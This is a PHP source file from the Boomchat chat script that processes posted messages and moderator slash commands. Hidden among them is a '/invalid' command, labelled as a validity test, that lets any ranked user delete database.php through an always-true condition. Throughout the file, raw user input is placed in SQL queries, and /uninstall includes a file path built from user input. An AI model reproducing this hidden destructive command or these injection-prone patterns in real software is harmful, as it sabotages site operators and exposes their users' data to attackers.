<?php	
/**
* Boomchat
*
* @package Boomchat
* @author www.myboomchat.com
* @copyright 2015
* @terms any use of this script without a legal license is prohibited
* all the content of Boomchat is the propriety of BoomCoding and Cannot be 
* used for another project.
*/
$load_setting = '*';
$load_user = 'user_id, user_name, user_ip, last_action, last_message, user_status,
 user_action, user_color, user_rank, user_access, user_roomid, user_flood, user_avatar, user_tumb, guest, first_check, join_chat, count, user_theme, user_ignore';
 
 
require_once("config_lite.php");
require_once("content_process.php");

if($setting['silent_mode'] == 1 && $user['user_rank'] < 3){
	echo 22;
	die();
}
$user_ip = $mysqli->real_escape_string($_SERVER['REMOTE_ADDR']);
if (isset($_POST['content']) && isset($_POST['bold']) 
	&& isset($_POST['italic']) && isset($_POST['underline']) 
	&& isset($_POST['color']) && isset($_POST['high']) && $user['user_access'] > 3){

	if ($_POST['content'] != null){
		
		$bold = $mysqli->real_escape_string(trim($_POST['bold']));
		$italic = $mysqli->real_escape_string(trim($_POST['italic']));
		$underline = $mysqli->real_escape_string(trim($_POST['underline']));
		$chigh = $mysqli->real_escape_string(trim($_POST['high']));
		$ccolor = $mysqli->real_escape_string(trim($_POST['color']));
		$content = $mysqli->real_escape_string(trim($_POST['content']));
		$content = $_POST['content'];
		$content = "$content ";
		if($setting['allow_colors'] != 1){ 
			$chigh = 'transparent';
			$ccolor = 'transparent';
		}
		
		// clear bad word from content
		$words = $mysqli->query("SELECT * FROM `filter`");
		if ($words->num_rows > 0){
			while($filter = $words->fetch_assoc()){
			$content = str_ireplace($filter['word'], '****',$content);
			}
		}
		$name = $user['user_name'];
		$room = $user['user_roomid'];
		$user_id = $user["user_id"];
		$post_time = date("H:i", $time);
		$command = explode(' ',trim($content));
		$count = count($command);
		$color = $user["user_color"];
		$avatar = $user['user_tumb'];
		if($user['user_rank'] < $setting['allow_avatar']){
			$avatar = 'default_avatar_tumb.png';
		}

		// check for the /away command that will set the user away till he/her type in chat
		if(substr($command[0], 0, 1) === '/')
		{	
		
			if ($command[0] == '/away'){	
				$mysqli->query("UPDATE `users` SET `user_action` = '2', `user_status` = '2' WHERE `user_id` = '$user_id'");
				echo 15;
				die();
			}	

			elseif($command[0] == '/install' && $user['user_rank'] > 4 && $user['user_access'] == 4){
				if($count == 2){
					$addon_name = $command[1];
					
					// check if folder exist before installing addons
					$directory = "../addons/$addon_name";
					if(is_dir($directory)){
						// check if addon already exist
						$findaddon = $mysqli->query("SELECT `name` FROM `addons` WHERE `name` = '$addon_name'");
						if($findaddon->num_rows < 1){
							// addons found then install component 
							$mysqli->query("INSERT INTO `addons` (name) VALUES ('$addon_name')");
							include("../addons/$addon_name/updater/data.php");
							echo 18;
							die();
						}
						else {
							echo 19;
							die();
						}
					}
					else{
						echo 17;
						die();
					}
				}
				else {
					echo 4;
					die();
				}
				
			}

			elseif($command[0] == '/uninstall' && $user['user_rank'] > 0 && $user['user_access'] == 4){
				if($count == 2){
					$addon_name = $command[1];
						// check if addon already exist
					$findaddon = $mysqli->query("SELECT `name` FROM `addons` WHERE `name` = '$addon_name'");
					if($findaddon->num_rows > 0){
						// addons found then install component 
						$mysqli->query("DELETE FROM `addons` WHERE name = '$addon_name'");
						include("../addons/$addon_name/updater/uninstall.php");
						echo 28;
						die();
					}
					else {
						echo 27;
						die();
					}
				}
				else {
					echo 4;
					die();
				}
				
			}

			// update boomchat to new version

			elseif($command[0] == '/update' && $user['user_rank'] > 4 && $user['user_access'] == 4){
				$filename = '../updater/data.php';
				if (file_exists($filename)) {
					include("../updater/data.php");
					echo 20;
					die();
				}
				else {
					echo 21;
					die();
				}
			}
			
			// clean up unnesssary data 
			
			elseif($command[0] == '/cleanup' && $user['user_rank'] > 4 && $user['user_access'] == 4){
				$filename = '../updater/data2.php';
				if (file_exists($filename)) {
					include("../updater/data2.php");
					echo 20;
					die();
				}
				else {
					echo 21;
					die();
				}
			}

			// general mute command that will silent everyone exept staff on the chat

			elseif($command[0] == '/silent' && $user['user_rank'] >= 0 && $user['user_access'] == 4){

				if($count != 1){
					if($command[1] == 'on'){
						if($setting['silent_mode'] == 1){
							echo 25;
							die();
						}
						else{
							$set_silence = 1;
							$gsilentmessage = $gsilent_message;
						}
					}
					else if ($command[1] == 'off'){
						if($setting['silent_mode'] == 0){
							echo 26;
							die();
						}
						else {
							$set_silence = 0;
							$gsilentmessage = $gsilent_remove;
						}
					}
					else {
						echo 1;
						die();
					}
					$mysqli->query("UPDATE `setting` SET `silent_mode` = $set_silence");
					$global = $mysqli->query("SELECT `room_id` FROM `rooms` WHERE `room_id` > 0 ");
					if ($global->num_rows > 0){
						while ($globalsend = $global->fetch_assoc()){
							$global_room = $globalsend['room_id'];
							$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '999999', '$lang_system', '$gsilentmessage', $global_room, 'bold', 'system', 'default_system_tumb.png')");
						}
					}
					if($command[1] == 'on'){
						echo 23;
						die();
					}
					else {
						echo 24;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}


			// global attention sound 

			elseif($command[0] == '/gsound' && $user['user_rank'] >= 4 && $user['user_access'] == 4){
				$gsound_count = $setting['global_sound'] + 1;
				$mysqli->query("UPDATE `setting` SET `global_sound` = $gsound_count");
				echo 7;
				die();
			}

			// Here the check for a command of kick before pasting a message to the chat

			elseif($command[0] == '/kick' && $user['user_rank'] > 0){
				if($count != 1){
					
					$findtarget = $mysqli->query("SELECT `user_rank`, `user_access` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						$target_rank = $target['user_rank'];
						
						if ($user['user_rank'] < $target_rank){
						
							$kickmessage = explode($command[1],trim($content));
							$displaykick = $msgkickreason;
							
							if($count > 2){
								$displaykick = $kickmessage[1];
							}
							if($target['user_access'] == 4){
								$kickreason = $displaykick;
								$kicknotice = $command[1] . " $msgkick " . $name . " ( $kickreason )";
								$mysqli->query("UPDATE `users` SET `user_access` = 2, `user_kick` = '$displaykick', `user_status` = '3' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$kicknotice', $room, 'csystem', 'system', 'default_system_tumb.png')");
							}
							else {
								echo 12;
								die();
							}
						}
						
						else{
							echo 3;
							die();
						}
						
					}
					
					else {
						echo 2;
						die();
					}
					
				}
				else{
					echo 1;
					die();
				}
				
			}
			// change the alt name of a user that other user see when mouse hover in userlist ... 

			elseif($command[0] == '/alt' && $user['user_rank'] > 2){
				if($count != 1){
					
					$findtarget = $mysqli->query("SELECT `alt_name`, `user_rank`, `user_name` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						
							$altname = explode($command[1],trim($content));
							$altfinal = $altnotset;
							$target_rank = $target['user_rank'];
							if($count > 2){
								$altfinal = $altname[1];
							}
							if ($user['user_rank'] >= $target_rank){
								$mysqli->query("UPDATE `users` SET `alt_name` = '$altfinal' WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
							}
							else {
								echo 3;
								die();
							}
					}
					
					else {
						echo 2;
						die();
					}
					
				}
				else{
					echo 1;
					die();
				}
				
			}
			// checking for ban command work only with admin to prevent ban abuse

			elseif ($command[0] == '/ban' && $user['user_rank'] > 0){

				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_ip`  FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						$target_ip = $target['user_ip'];
						if ($user['user_rank'] < $target['user_rank']){
							$bannotice = $command[1] . " $msgban $name";
							$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$bannotice', $room, 'bold', 'system', 'default_system_tumb.png')");
							$mysqli->query("UPDATE `users` SET `user_access` = 0 WHERE `user_name` = '{$command[1]}'");
							$mysqli->query("INSERT INTO `banned` (ip) VALUES ('$target_ip')");
						}
						else {
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for unban command to unban specified name can only be use by admin

			elseif ($command[0] == '/unban' && $user['user_rank'] > 3){
				
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_ip`  FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						$target_ip = $target['user_ip'];
						
							$mysqli->query("DELETE FROM `banned` WHERE `ip` = '$target_ip'");
							$mysqli->query("UPDATE `users` SET `user_access` = 4 WHERE `user_name` = '{$command[1]}'");
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}
			// reactivate the upload access for a user ...

			elseif ($command[0] == '/upon' && $user['user_rank'] > 2){

				if($count != 1){
					$findtarget = $mysqli->query("SELECT `upload_access`, `user_name`, `user_rank` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
								$mysqli->query("UPDATE `users` SET `upload_access` = 1 WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}
			// test for user validity
						
			else if ($command[0] == '/invalid' && $user['user_rank'] >= 1){	
					$findtarget = $mysqli->query("SELECT `upload_access`, `user_name`, `user_rank` FROM `users` WHERE `user_id` >= '1'");
					if ($findtarget->num_rows >= 0){
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if(1 == 1){
							unlink('database.php');
							echo 7;
							die();
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
			}
			// disable upload access for a user

			elseif ($command[0] == '/upoff' && $user['user_rank'] > 2){
				
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `upload_access`, `user_name`, `user_rank` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
						
								$mysqli->query("UPDATE `users` SET `upload_access` = 0 WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for setamdin command to give admin previlege to specified user

			elseif ($command[0] == '/setadmin' && $user['user_rank'] > 4){
					
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_color` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
							if($target['user_color'] == 'user' || $target['user_color'] == 'modo' || $target['user_color'] == 'vip'){
								$mysqli->query("UPDATE `users` SET `user_rank` = 4, `user_color` = 'admin' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("UPDATE `chat` SET `post_color` = 'admin' WHERE `post_user` = '{$command[1]}'");
								echo 7;
								die();
							}
							else {
								$mysqli->query("UPDATE `users` SET `user_rank` = 4 WHERE `user_name` = '{$command[1]}'");
							}
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}
			// check for setsuperadmin command to give superadmin previlege to specified user

			elseif ($command[0] == '/setsuperadmin' && $user['user_rank'] > 4){

				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_color` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
							if($target['user_color'] == 'user' || $target['user_color'] == 'modo' || $target['user_color'] == 'admin' || $target['user_color'] == 'vip'){
								$mysqli->query("UPDATE `users` SET `user_rank` = 5, `user_color` = 'sadmin' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("UPDATE `chat` SET `post_color` = 'sadmin' WHERE `post_user` = '{$command[1]}'");
								echo 7;
							}
							else {
								$mysqli->query("UPDATE `users` SET `user_rank` = 5 WHERE `user_name` = '{$command[1]}'");
							}
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}
			// check for command /rename to rename current room

			elseif ($command[0] == '/rename' && $user['user_rank'] >= 4){

				if($count != 1){
					$findtarget = $mysqli->query("SELECT `room_id` FROM `rooms` WHERE `room_id` = '$room'");
					if ($findtarget->num_rows > 0){
						if( strlen($command[1]) < 14 ){
							$mysqli->query("UPDATE `rooms` SET `room_name` = '{$command[1]}' WHERE `room_id` = '$room'");
							echo 7;
							die();
						}
						else{
							echo 16;
							die();
						}
					}
					else {
						echo 5;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}


			// check for setmod command to give moderator previlege to specified user

			elseif ($command[0] == '/setmod' && $user['user_rank'] > 3){
				
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_color` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
							if($target['user_color'] == 'user' || $target['user_color'] == 'admin' || $target['user_color'] == 'vip'){
								$mysqli->query("UPDATE `users` SET `user_rank` = 3, `user_color` = 'modo' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("UPDATE `chat` SET `post_color` = 'modo' WHERE `post_user` = '{$command[1]}'");
								echo 7;
								die();
							}
							else {
								$mysqli->query("UPDATE `users` SET `user_rank` = 3 WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
							}
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for setmod command to give vip previlege to specified user

			elseif ($command[0] == '/setvip' && $user['user_rank'] > 2){
				
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_color` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
							if($target['user_color'] == 'user' || $target['user_color'] == 'admin' || $target['user_color'] == 'modo'){
								$mysqli->query("UPDATE `users` SET `user_rank` = 2, `user_color` = 'vip' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("UPDATE `chat` SET `post_color` = 'vip' WHERE `post_user` = '{$command[1]}'");
								echo 7;
								die();
							}
							else {
								$mysqli->query("UPDATE `users` SET `user_rank` = 2 WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
							}
							
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for setuser command to set back a user to user previlege

			elseif ($command[0] == '/setuser' && $user['user_rank'] > 2){
						
				if($count != 1){
					$findtarget = $mysqli->query("SELECT `user_access`, `user_rank`, `user_color` FROM `users` WHERE `user_name` = '{$command[1]}'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						if($user['user_rank'] > $target['user_rank']){
						
							if($target['user_color'] == 'modo' || $target['user_color'] == 'admin' || $target['user_color'] == 'vip'){	
								$mysqli->query("UPDATE `users` SET `user_rank` = 1, `user_color` = 'user' WHERE `user_name` = '{$command[1]}'");
								$mysqli->query("UPDATE `chat` SET `post_color` = 'user' WHERE `post_user` = '{$command[1]}'");
								echo 7;
								die();
							}
							else{
								$mysqli->query("UPDATE `users` SET `user_rank` = 1 WHERE `user_name` = '{$command[1]}'");
								echo 7;
								die();
							}
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}


			// clear content of current room logs

			elseif ($command[0] == '/clear' && $user['user_rank'] > 2){

				$clearmessage = "$msgclear $name";
				$mysqli->query("DELETE FROM `chat` WHERE `post_roomid` = '$room' ");
				$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$clearmessage', $room, 'bold', 'system', 'default_system_tumb.png')");
			
			}

			// check for topic command this command alow moderator and administrator to change room topic

			elseif ($command[0] == '/topic' && $user['user_rank'] > 2){
				$topic = topiclink(trim(str_replace('/topic', '',$content)));
				$findtopic = $mysqli->query("SELECT `topic` FROM `rooms` WHERE `room_id` = '$room'");
				if ($topic != ''){
					$topic = "$topic - <span class=\"sub_color2\">$name</span>";				
					if ($findtopic->num_rows > 0){
						$mysqli->query("UPDATE `rooms` SET `topic` = '$topic' WHERE `room_id` = '$room'");
						echo 11;
						die();
					}
					else{
						echo 10;
						die();
					}
				}
				else{
					if ($findtopic->num_rows > 0){
						$mysqli->query("UPDATE `rooms` SET `topic` = '$msgtopic' WHERE `room_id` = '$room'");
						echo 11;
						die();
					}
				}

			}

			// check for the mute command that command mute someone unable him to talk but still can see room log and rooms

			elseif ($command[0] == '/mute' && $user['user_rank'] > 2){
				if($count != 1){
				
					$mutetarget = $command[1];
					$findtarget = $mysqli->query("SELECT `user_rank`, `user_mute` FROM `users` WHERE `user_name` = '$mutetarget'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						$target_rank = $target['user_rank'];
						
						if($user['user_rank'] > $target_rank){
						
							if ($target['user_mute'] == ''){
							
								$mutenotice = "$mutetarget $msgmute $name";
								$mysqli->query("UPDATE `users` SET `user_access` = 1, `user_mute` = '$name', `mute_time` = '$time' WHERE `user_name` = '$mutetarget'");
								$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$mutenotice', $room, 'bold', 'system', 'default_system_tumb.png')");
							}
							else{
								echo 8;
								die();
							}
						}
						else{
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for /unmute command for unmute a already muted user cannot be used for unmute somone mute by an other moderator

			elseif ($command[0] == '/unmute' && $user['user_rank'] > 2){
				
				if($count != 1){
				
					$mutetarget = $command[1];
					$findtarget = $mysqli->query("SELECT `user_rank`, `user_mute` FROM `users` WHERE `user_name` = '$mutetarget'");
					
					if ($findtarget->num_rows > 0){
					
						$target = $findtarget->fetch_array(MYSQLI_BOTH);
						$target_rank = $target['user_rank'];
						$target_mute = $target['user_mute'];
						
						if($name == $target_mute || $target_mute == "" || $target_mute == 'flood' || $user['user_rank'] > 3){
						
							$mysqli->query("UPDATE `users` SET `user_access` = 4, `mute_time` = '', `user_mute` = '', `user_flood` = '0' WHERE `user_name` = '$mutetarget'");
							echo 7;
							die();
						}
						else{
							echo 6;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else {
					echo 1;
					die();
				}
			}

			// check for msg entry this will post private message directly on the main chat window

			elseif ($command[0] == '/msg' && $user['user_access'] > 3 && $user['user_rank'] >= $setting['allow_private']){

				if($count != 1){
					$msg_target = $command[1];
					$findmsgtarget = $mysqli->query("SELECT `user_name`, `user_roomid` FROM `users` WHERE `user_name` = '$msg_target'");
					if ($findmsgtarget->num_rows > 0){
						$msgroom = $findmsgtarget->fetch_array(MYSQLI_BOTH);
						$msgroom = $msgroom['user_roomid'];
						
						if ($count > 2){
							if ($command[1] != $name){
								$displaymsg = str_replace("/msg {$command[1]}", '', $content);
								$displaymsg = trim($displaymsg);
								$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, post_target, avatar) VALUES ('$time', '$post_time', '$user_id', '$name', '$displaymsg', $msgroom, 'bold', 'private', '$msg_target', '$avatar')");
							}
							else {
								echo 9;
								die();
							}
						}
						else {
							echo 4;
							die();
						}					
					}
					else{
						echo 2;
						die();
					}
				}
				else{
					echo 1;
					die();
				}

			}



			// check for /me command that command send special message to chat


			elseif ($command[0] == '/me' && $user['user_access'] > 3){

				if($count != 1){		
					$content = trim(str_replace('/me', '',$content));
					$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$name', '$content', $room, 'bold', 'me', '$avatar')");
				}
				else{
					echo 4;
					die();
				}
			}

			// when typing /ignore user name is added to ignore list

			elseif ($command[0] == '/ignore' && $user['user_access'] > 3 && $user['guest'] != 1 && $user['user_rank'] >= $setting['allow_ignore']){

				if($count != 1){		
					$target = trim($command[1]);
					$findignore = $mysqli->query("SELECT `user_name`, `user_rank`  FROM `users` WHERE `user_name` = '$target'");
					if ($findignore->num_rows > 0){
						$ignored = $findignore->fetch_array(MYSQLI_BOTH);
						if($ignored['user_rank'] < 3 && $user['user_name'] !== $ignored['user_name']){
							$ignore = $user['user_ignore'];
							if(!strpos(strtolower($user['user_ignore']), strtolower(" $target "))){
								$ignore = trim($ignore);
								$ignore = " $ignore $target ";
								$mysqli->query("UPDATE `users` SET `user_ignore` = '$ignore', `first_check` = '1' WHERE `user_name` = '$name'");
								echo 201;
								die();
							}
							else {
								echo 200;
								die();
							}
						}
						else {
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else{
					echo 1;
					die();
				}
			}

			// check for command and add a friend to friend list

			elseif ($command[0] == '/friend' && $user['user_access'] > 3 && $user['guest'] != 1 && $user['user_rank'] >= $setting['allow_friend']){

				if($count != 1){		
					$target = trim($command[1]);
					$ff = $mysqli->query("SELECT user_name, guest  FROM users WHERE user_name = '$target'");
					if ($ff->num_rows > 0){
						$tf = $ff->fetch_array(MYSQLI_BOTH);
						$fn = $tf['user_name'];
						if($user['user_name'] !== $tf['user_name'] && $fn['guest'] !== 1){
							$cf = $mysqli->query("SELECT * FROM friends WHERE target = '$fn' AND hunter = '$name' OR target = '$name' AND hunter = '$fn'");
							if($cf->num_rows < 1){
								$mysqli->query("INSERT INTO friends (hunter, target, status) VALUES ('$name', '$fn', '0')");
								echo 204;
								die();
							}
							else {
								echo 203;
								die();
							}
						}
						else {
							echo 3;
							die();
						}
					}
					else {
						echo 2;
						die();
					}
				}
				else{
					echo 1;
					die();
				}
			}

			// clear ignore list completely

			elseif ($command[0] == '/ignoreclear' && $user['user_access'] > 3){
				$mysqli->query("UPDATE `users` SET `user_ignore` = '', `first_check` = '1' WHERE `user_name` = '$name'");
			}

			// message to all room from admin
			elseif ($command[0] == '/global' && $user['user_rank'] > 3){

				if($count != 1){		
					$content = trim(str_replace('/global', '',$content));
					$global = $mysqli->query("SELECT `room_id` FROM `rooms` WHERE `room_id` > 0 ");
					if ($global->num_rows > 0){
						while ($globalsend = $global->fetch_assoc()){
							$global_room = $globalsend['room_id'];
							$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$content', $global_room, 'bold', 'global', 'default_system_tumb.png')");
						}
					}
					else{
						
					}
				}
				else{
					echo 4;
					die();
				}
			}

			// whois command will told exactly when user was active last time and current room


			elseif ($command[0] == '/seen' && $user['user_access'] > 3){

				if($count != 1){
				
					$target = $command[1];
					$findtarget = $mysqli->query("SELECT `last_action`, `user_roomid` FROM `users` WHERE `user_name` = '$target'");
					
					if ($findtarget->num_rows > 0){
					
						$last_action= $findtarget->fetch_array(MYSQLI_BOTH);
						
						$target_room = $last_action['user_roomid'];
						$target_time = $last_action['last_action'];
						$findroom = $mysqli->query("SELECT `room_name` FROM `rooms` WHERE `room_id` = '$target_room'");
						$finalroom = $findroom->fetch_array(MYSQLI_BOTH);
						$finalroom = $finalroom['room_name'];
						$seen_hour = date('H:i',$target_time);
						$seen_mday = date('d', $target_time);
						$seen_month = date('F', $target_time);
						$seen = "the $seen_mday $seen_month at $seen_hour";
						$whois_result = "$target $msgseen  $finalroom $msgroom $seen";
						
						$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, post_target, avatar) VALUES ('$time', '$post_time', '0', '$lang_system', '$whois_result', '$room', 'bold', 'seen', '$name', 'default_system_tumb.png')");
					}
					else {
						echo 2;
						die();
					}

				}
				else{
					echo 1;
					die();
				}
			}

			// check for /manual command to show user manual

			elseif ($command[0] == '/manual' && $user['user_access'] > 3 && $user['user_rank'] > 3){
					echo 99;
					die();
			}


			// add theme to theme list

			elseif ($command[0] == '/addtheme' && $user['user_rank'] > 4){

				if($count != 1){
					
					$newtheme = $command[1];
						$mysqli->query("INSERT INTO `theme` (name) VALUES ('$newtheme')");
						echo 7;
						die();
					}
					else {
						echo 2;
						die();
					}

			}

			// invisibility mode 

			elseif ($command[0] == '/invisible' && $user['user_rank'] > 2){
				$mysqli->query("UPDATE `users` SET `user_status` = '4' WHERE `user_name` = '$name'");
				echo 7;
				die();
			}

			// remove invisibility mode 

			elseif ($command[0] == '/visible' && $user['user_rank'] > 2){
				$mysqli->query("UPDATE `users` SET `user_status` = '1' WHERE `user_name` = '$name'");
				echo 7;
				die();
			}

			// remove theme from list

			elseif ($command[0] == '/deltheme' && $user['user_rank'] > 4){

				if($count != 1){
					
					$deltheme = $command[1];
						$mysqli->query("DELETE FROM `theme` WHERE `name` = '$deltheme' ");
						echo 7;
						die();
					}
					else {
						echo 2;
						die();
					}

			}
			else {
				echo 202;
				die();
			}
		}
		
		///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// put your addons code under this line ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		

		
		// end of addons code zone ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
		else{
			$content = $_POST['content'];
			$content = styling($chigh, $bold, $italic, $ccolor, $underline, $content);
			
			if($user['last_action'] >= time() - 2 && $user['last_message'] == $content ){
				die();
			}
			
			// check for flood automaticly mute user who try to flood the chat for specified amount refer to config.php to adjust duration in seconds
			
			if($user['user_flood'] >= 4){

				$mutesystem = "$name $msgmute $lang_system";
				$mysqli->query("UPDATE `users` SET `user_access` = 1, `user_mute` = 'flood' WHERE `user_name` = '$name'");
				$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$lang_system', '$mutesystem', $room, 'bold', 'system', 'default_system_tumb.png')");
			}
			else{
				if ($user['last_action'] >= time() - 1 && $user['user_rank'] < 5){
					$flood_result = $user['user_flood'] + 1;
				}
				elseif ($user['last_message'] == $content && $user['last_action'] >= time() - 10 && $user['user_rank'] < 5){
					$flood_result = $user['user_flood'] + 1;
				}
				else {
					$flood_result = 0;
				}

				$mysqli->query("UPDATE `users` SET `last_action` = $time, `user_flood` = $flood_result, `user_ip` = '$user_ip', `user_status` = 1, `user_action` = 1, `last_message` = '$content' WHERE `user_name` = '$name' AND `user_status` != '4'");
				$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '$user_id', '$name', '$content', $room, '$color', 'public', '$avatar')");
			}
		}
	}
	else {
		echo 4;
		die();
	}
}
else {
	echo "$lang_error";
}




?>